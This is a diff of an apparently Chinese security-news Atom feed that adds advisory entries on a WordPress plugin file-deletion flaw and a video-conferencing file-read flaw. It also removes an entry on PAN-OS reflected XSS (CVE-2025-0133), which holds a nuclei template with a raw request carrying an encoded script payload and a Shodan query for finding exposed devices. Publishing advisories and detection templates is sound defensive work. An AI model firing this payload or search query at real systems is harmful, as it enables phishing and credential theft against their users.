@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-14T08:43:37.614Z</updated>
+  <updated>2025-06-14T10:00:06.458Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,57 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>The Image Resizer On The Fly plugin for WordPress is vulnerable to arbitrary file deletion due to</title>
+    <link href="http://example.com/2025/06/14/github_4133973639/"/>
+    <id>http://example.com/2025/06/14/github_4133973639/</id>
+    <published>2025-06-14T10:00:06.461Z</published>
+    <updated>2025-06-14T10:00:06.458Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gxqj-2gvr-3p2f">https://github.com/advisories/GHSA-gxqj-2gvr-3p2f</a></p><p><strong>CVSS 评分：</strong> 9.1</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6065">https://nvd.nist.gov/vuln/detail/CVE-2025-6065</a></p></li><li><p><a href="https://plugins.trac.wordpress.org/browser/image-resizer-on-the-fly/trunk/image-resizer-on-the-fly.php#L25">https://plugins.trac.wordpress.org/browser/image-resizer-on-the-fly/trunk/image-resizer-on-the-fly.php#L25</a></p></li><li><p><a href="https://wordpress.org/plugins/image-resizer-on-the-fly">https://wordpress.org/plugins/image-resizer-on-the-fly</a></p></li><li><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/14877ff6-e393-41a3-91c1-fe7f477297cc?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/14877ff6-e393-41a3-91c1-fe7f477297cc?source=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gxqj-2gvr-3p2f">https://github.com/advisories/GHSA-gxqj-2gvr-3p2f</a></p></li></ul><p><strong>描述：</strong></p><p>The Image Resizer On The Fly plugin for WordPress is vulnerable to arbitrary file deletion due to insufficient file path validation in the ‘delete’ task in all versions up to, and including, 1.1. This makes it possible for unauthenticated attackers to delete arbitrary files on the server, which can easily lead to remote code execution when the right file is deleted (such as wp-config.php).</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gxqj-2gvr-3p2f&quot;&gt;https://github.com/advisories/GHSA-gxqj-2gvr-3p2f&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>会捷通云视讯系统 fileDownload 任意文件读取漏洞</title>
+    <link href="http://example.com/2025/06/14/weixin_2079132269/"/>
+    <id>http://example.com/2025/06/14/weixin_2079132269/</id>
+    <published>2025-06-14T09:39:07.445Z</published>
+    <updated>2025-06-14T09:39:07.441Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/JCJgY7JFJWphQ49gYgpcXQ">https://mp.weixin.qq.com/s/JCJgY7JFJWphQ49gYgpcXQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/JCJgY7JFJWphQ49gYgpcXQ&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
+    
+  </entry>
   
   <entry>
     <title>以色列袭击前五角大楼附近的活动激增</title>
@@ -479,7 +530,7 @@
     <published>2025-06-13T22:30:05.638Z</published>
     <updated>2025-06-13T22:30:05.633Z</updated>
     
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-7f8r-222p-6f5g">https://github.com/advisories/GHSA-7f8r-222p-6f5g</a></p><p><strong>仓库 Star：</strong> 3997</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g">https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49596">https://nvd.nist.gov/vuln/detail/CVE-2025-49596</a></p></li><li><p><a href="https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979">https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979</a></p></li><li><p><a href="https://github.com/advisories/GHSA-7f8r-222p-6f5g">https://github.com/advisories/GHSA-7f8r-222p-6f5g</a></p></li></ul><p><strong>描述：</strong></p><p>Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio. Users should immediately upgrade to version 0.14.1 or later to address these vulnerabilities.</p><p>Credit: Rémy Marot <a href="mailto:&#x62;&#x75;&#103;&#104;&#117;&#x6e;&#116;&#101;&#x72;&#x73;&#64;&#x74;&#x65;&#110;&#x61;&#98;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;">bughunters@tenable.com</a></p>]]></content>
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-7f8r-222p-6f5g">https://github.com/advisories/GHSA-7f8r-222p-6f5g</a></p><p><strong>仓库 Star：</strong> 3997</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g">https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49596">https://nvd.nist.gov/vuln/detail/CVE-2025-49596</a></p></li><li><p><a href="https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979">https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979</a></p></li><li><p><a href="https://github.com/advisories/GHSA-7f8r-222p-6f5g">https://github.com/advisories/GHSA-7f8r-222p-6f5g</a></p></li></ul><p><strong>描述：</strong></p><p>Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio. Users should immediately upgrade to version 0.14.1 or later to address these vulnerabilities.</p><p>Credit: Rémy Marot <a href="mailto:&#x62;&#x75;&#x67;&#x68;&#x75;&#x6e;&#116;&#101;&#114;&#115;&#x40;&#116;&#101;&#110;&#97;&#x62;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#109;">bughunters@tenable.com</a></p>]]></content>
     
     
       
@@ -493,60 +544,6 @@
     
     
     <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PAN-OS 反射型跨站脚本漏洞</title>
-    <link href="http://example.com/2025/06/13/github_3073953974/"/>
-    <id>http://example.com/2025/06/13/github_3073953974/</id>
-    <published>2025-06-13T22:00:18.886Z</published>
-    <updated>2025-06-13T22:00:18.883Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PAN-OS 反射型跨站脚本漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-0133</li></ul><p><strong>漏洞类型：</strong> 跨站可执行脚本</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Palo Alto Networks PAN-OS®软件中的GlobalProtect™网关和门户功能存在反射型跨站脚本（XSS）漏洞，当认证的Captive Portal用户点击特制链接时，可以在其浏览器上下文中执行恶意JavaScript。主要风险是可能导致凭证盗窃的钓鱼攻击，特别是如果启用了Clientless VPN。</p><p><strong>产品厂商：</strong> Palo Alto Networks</p><p><strong>产品名称：</strong> PAN-OS</p><p><strong>搜索语法：</strong> http.favicon.hash:”-631559155”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/34e526943bc7ac792034d2c306f1e35bda9a2acc/http%2Fcves%2F2025%2FCVE-2025-0133.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/34e526943bc7ac792034d2c306f1e35bda9a2acc/http%2Fcves%2F2025%2FCVE-2025-0133.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol"></span><br><span class="hljs-symbol">id:</span> CVE<span class="hljs-number">-2025</span><span class="hljs-number">-0133</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">info:</span><br><span class="hljs-symbol">  name:</span> PAN-OS - Reflected Cross-Site Scripting<br><span class="hljs-symbol">  author:</span> xbow<span class="hljs-punctuation">,</span>DhiyaneshDK<br><span class="hljs-symbol">  severity:</span> medium<br><span class="hljs-symbol">  description:</span> |<br>    A reflected cross-site scripting (XSS) vulnerability in the GlobalProtect™ gateway <span class="hljs-keyword">and</span> portal features of Palo Alto Networks PAN-OS® software enables execution of malicious JavaScript in the context of an authenticated Captive Portal user&#x27;s browser when they click on a specially crafted link.The primary risk is phishing attacks that can lead <span class="hljs-keyword">to</span> credential theft—particularly if you enabled Clientless VPN.<br><span class="hljs-symbol">  reference:</span><br>    - https://security.paloaltonetworks.com/CVE<span class="hljs-number">-2025</span><span class="hljs-number">-0133</span><br>    - https://hackerone.com/reports/<span class="hljs-number">3096384</span><br><span class="hljs-symbol">  classification:</span><br>    epss-score: <span class="hljs-number">0.00102</span><br>    epss-percentile: <span class="hljs-number">0.29276</span><br><span class="hljs-symbol">  metadata:</span><br><span class="hljs-symbol">    verified:</span> <span class="hljs-keyword">true</span><br>    <span class="hljs-keyword">max</span>-request: <span class="hljs-number">1</span><br>    shodan-query: http.favicon.hash:<span class="hljs-string">&quot;-631559155&quot;</span><br><span class="hljs-symbol">  tags:</span> hackerone<span class="hljs-punctuation">,</span>cve<span class="hljs-punctuation">,</span>cve<span class="hljs-number">2025</span><span class="hljs-punctuation">,</span>xss<span class="hljs-punctuation">,</span>pan-os<span class="hljs-punctuation">,</span><span class="hljs-keyword">global</span>-protect<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">http:</span><br>  - raw:<br>      - |<br>        GET /ssl-vpn/getconfig.esp?client-<span class="hljs-keyword">type</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;protocol-version<span class="hljs-operator">=</span>p<span class="hljs-number">1</span>&amp;app-version<span class="hljs-operator">=</span><span class="hljs-number">3.0</span>.<span class="hljs-number">1</span><span class="hljs-number">-10</span>&amp;clientos<span class="hljs-operator">=</span>Linux&amp;os-version<span class="hljs-operator">=</span>linux<span class="hljs-number">-64</span>&amp;hmac-algo<span class="hljs-operator">=</span>sha<span class="hljs-number">1</span><span class="hljs-variable">%2</span>Cmd<span class="hljs-number">5</span>&amp;enc-algo<span class="hljs-operator">=</span>aes<span class="hljs-number">-128</span>-cbc<span class="hljs-variable">%2</span>Caes<span class="hljs-number">-256</span>-cbc&amp;authcookie<span class="hljs-operator">=</span><span class="hljs-number">12</span>cea<span class="hljs-number">70227</span>d<span class="hljs-number">3</span>aafbf<span class="hljs-number">25082</span>fac<span class="hljs-number">1</span>b<span class="hljs-number">6</span>f<span class="hljs-number">51</span>d&amp;portal<span class="hljs-operator">=</span>us-vpn-gw-N&amp;user<span class="hljs-operator">=</span><span class="hljs-variable">%3</span>Csvg<span class="hljs-variable">%20</span>xmlns<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Fwww.w<span class="hljs-number">3</span>.org<span class="hljs-variable">%2</span>F<span class="hljs-number">2000</span><span class="hljs-variable">%2</span>Fsvg<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>Cscript<span class="hljs-variable">%3</span>Eprompt<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>XSS<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fscript<span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fsvg<span class="hljs-variable">%3</span>E&amp;domain<span class="hljs-operator">=</span><span class="hljs-variable">%28</span>empty_domain<span class="hljs-variable">%29</span>&amp;computer<span class="hljs-operator">=</span>computer HTTP/<span class="hljs-number">1.1</span><br>        Host: &#123;&#123;Hostname&#125;&#125;<br><br>    matchers-condition: <span class="hljs-keyword">and</span><br><span class="hljs-symbol">    matchers:</span><br>      - <span class="hljs-keyword">type</span>: word<br><span class="hljs-symbol">        part:</span> body<br><span class="hljs-symbol">        words:</span><br>          - &#x27;&lt;script&gt;prompt(<span class="hljs-string">&quot;XSS&quot;</span>)&lt;/script&gt;&#x27;<br>          - &#x27;authentication cookie&#x27;<br><span class="hljs-symbol">        condition:</span> <span class="hljs-keyword">and</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PAN-OS 反射型跨站脚本漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="跨站可执行脚本" scheme="http://example.com/tags/%E8%B7%A8%E7%AB%99%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>金华市人民政府与安恒信息签署深化合作框架协议</title>
-    <link href="http://example.com/2025/06/13/weixin_1902155890/"/>
-    <id>http://example.com/2025/06/13/weixin_1902155890/</id>
-    <published>2025-06-13T21:04:49.641Z</published>
-    <updated>2025-06-13T21:04:49.637Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/iBBwwXMcqnlsZXuB4BZMaA">https://mp.weixin.qq.com/s/iBBwwXMcqnlsZXuB4BZMaA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/iBBwwXMcqnlsZXuB4BZMaA&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
     
   </entry>
   
